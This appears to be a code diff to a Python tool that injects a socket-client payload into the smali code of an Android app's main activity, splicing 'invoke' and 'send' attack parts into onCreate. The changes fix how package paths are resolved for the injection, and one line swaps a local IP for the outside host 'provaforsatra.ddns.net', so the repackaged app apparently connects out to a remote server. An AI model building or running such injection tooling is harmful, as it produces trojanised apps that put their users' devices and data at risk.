@@ -235,7 +235,9 @@ def mainActivity_modifier(file, injection_type, client_payload):
 
 def mainActivity_socket_client(file, injection_type):
     activityMainPath, activityMain = get_main_activity(file)
-    print('path:', activityMain)
+    print('ActivityMain:', activityMain)
+    package = get_package(file)
+    print('The package',package)
 
     # ActivityMain without smali Extension
     activity_main_path = activityMainPath.replace(activityMain, '').replace('.smali', '')
@@ -246,8 +248,15 @@ def mainActivity_socket_client(file, injection_type):
     invoke = attack_parts[0][1]
     send = attack_parts[0][2]
 
-    send = re.sub(MAIN_ACTIVITY_PATH, 'L' + activityMain.replace(".", "/"), send)
-    send = re.sub(MAIN_ACTIVITY_NAME, activityMain, send)
+    if package in activityMain:
+        send = re.sub(MAIN_ACTIVITY_PATH, 'L' + activityMain.replace(".", "/"), send)
+        send = re.sub(MAIN_ACTIVITY_NAME, activityMain.replace(package,"").replace(".", ""), send)
+    else:
+        send = re.sub(MAIN_ACTIVITY_PATH, 'L'+package.replace(".","/")+ activityMain.replace(".", "/"), send)
+        send = re.sub(MAIN_ACTIVITY_NAME, activityMain.replace(".", "").replace(package, ""), send)
+
+
+
     send = re.sub('192.168.1.15', 'provaforsatra.ddns.net', send)
 
     print(send)
@@ -266,7 +275,10 @@ def mainActivity_socket_client(file, injection_type):
     onCreate_final = mainActivity.index(ON_CREATE_RETURN, onCreate_init)
     onCreate = mainActivity[onCreate_init:onCreate_final:]
 
-    invoke = re.sub(MAIN_ACTIVITY_PATH, PATH_SUFFIX + activityMain.replace(".", "/"), invoke)
+    if package in activityMain:
+        invoke = re.sub(MAIN_ACTIVITY_PATH, PATH_SUFFIX + activityMain.replace(".", "/"), invoke)
+    else:
+        invoke = re.sub(MAIN_ACTIVITY_PATH, PATH_SUFFIX + 'L'+package.replace(".","/")+ activityMain.replace(".", "/"), invoke)
     smali = before_onCreate + onCreate + invoke + "\n" + mainActivity[onCreate_final:len(mainActivity)] + "\n"
     # print(smali)
 
